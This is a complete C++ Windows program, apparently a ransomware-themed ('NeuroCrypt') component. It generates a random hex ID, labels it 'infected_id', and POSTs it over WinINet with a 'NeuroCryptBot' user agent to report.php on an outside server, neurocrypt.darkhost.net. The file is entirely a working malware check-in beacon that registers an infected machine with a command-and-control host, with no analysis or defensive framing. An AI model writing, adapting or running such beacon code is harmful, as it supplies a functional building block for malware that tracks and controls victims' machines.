#include <windows.h>
#include <wininet.h>
#include <string>
#include <ctime>
#include <cstdlib>
#include <sstream>
#include <iostream>

#pragma comment(lib, "wininet.lib")

std::string generarHex(int longitud) {
    const char* hexChars = "0123456789ABCDEF";
    std::string hex;
    for (int i = 0; i < longitud; ++i)
        hex += hexChars[rand() % 16];
    return hex;
}

int main() {
    srand(static_cast<unsigned int>(time(0)));

    std::string fakeHexID = generarHex(16);  

    std::string datos = "infected_id=" + fakeHexID;

    const wchar_t* servidor = L"neurocrypt.darkhost.net";
    const wchar_t* ruta = L"/report.php";

    HINTERNET hInternet = InternetOpenW(L"NeuroCryptBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 1;

    HINTERNET hConnect = InternetConnectW(hInternet, servidor, INTERNET_DEFAULT_HTTP_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) return 1;

    const wchar_t* tipos = L"Content-Type: application/x-www-form-urlencoded";

    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", ruta, NULL, NULL, NULL,
                                          INTERNET_FLAG_RELOAD, 0);

    if (!hRequest) return 1;

    BOOL enviado = HttpSendRequestW(hRequest, tipos, wcslen(tipos),
                                    (LPVOID)datos.c_str(), datos.size());

    if (enviado) {
        std::cout << "[+] Enviado a servidor con ID: " << fakeHexID << std::endl;
    } else {
        std::cerr << "[-] Error en el envío." << std::endl;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}
